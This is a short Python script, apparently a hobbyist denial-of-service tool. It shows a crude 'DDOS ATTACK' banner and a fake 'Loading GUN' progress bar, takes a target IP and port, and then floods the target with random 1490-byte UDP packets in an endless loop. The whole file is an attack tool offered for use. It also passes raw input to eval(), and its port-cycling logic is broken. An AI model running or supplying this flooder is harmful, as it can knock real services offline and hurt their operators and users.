import sys
import os
import time
import socket
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

print('')
print('DDOS ATTACK')
print('DONE')
print('WITH')
print('LOVE')
print('BITCH')
                                                
                                                  
web = input("Enter Target Website Ip : ")
webp = eval(input("Enter Port : "))


print("Loading GUN*                 1% ")
time.sleep(2)
print("Loading GUN**                10%")
time.sleep(2)
print("Loading GUN***               20%")
time.sleep(2)
print("Loading GUN****              30%")
time.sleep(2)
print("Loading GUN*****             40%")
time.sleep(2)
print("Loading GUN******            50%")
time.sleep(2)
print("Loading GUN*******           60%")
time.sleep(2)
print("Loading GUN********          70%")
time.sleep(2)
print("Loading GUN*********         80%")
time.sleep(2)
print("Loading GUN**********        90%")
time.sleep(2)
print("LOCKED AND LOADED****************** 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (web,webp))
     sent = sent + 1
     port = webp + 1
     print("Sent %s packet to %s throught this port:%s"%(sent,web,webp))
     if webp == 65534:
       webp = 1
